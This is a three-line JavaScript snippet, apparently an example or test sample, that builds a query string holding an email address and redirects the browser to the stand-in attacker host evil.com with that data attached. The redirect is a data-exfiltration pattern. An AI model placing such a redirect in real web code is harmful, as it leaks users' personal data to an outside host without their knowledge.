window.abcd = "?e=user@example.com";
var base = "https://evil.com/";
window.location.href = base + window.abcd;
